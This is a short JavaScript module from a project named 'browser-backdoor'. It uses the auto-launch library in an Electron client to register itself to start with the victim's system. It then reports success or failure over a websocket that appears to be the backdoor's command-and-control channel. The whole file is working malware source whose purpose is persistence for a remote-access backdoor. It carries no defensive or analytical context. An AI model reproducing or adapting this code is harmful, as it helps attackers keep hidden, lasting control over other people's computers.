/**
 * @file enableStartup Module
 * @summary Enables startup of client application.
 * @author Carleton Stuberg
 * @see https://github.com/IMcPwn/browser-backdoor
 * @license MIT
 * @version 0.1
 */

electron = require('electron');

AutoLaunch = require('auto-launch');

appLauncher = new AutoLaunch({
    // Change this to the name of the application or what
    // should appear in the startup menu.
    name: 'BB'
});

appLauncher.isEnabled().then(function(enabled){
    if(enabled) {
        ws.send("Startup already enabled");
        return;
    }
    appLauncher.enable();
    ws.send("Enabled startup");
}).then(function(err){
    if (err !== undefined) ws.send("Error: " + err.toString());
});
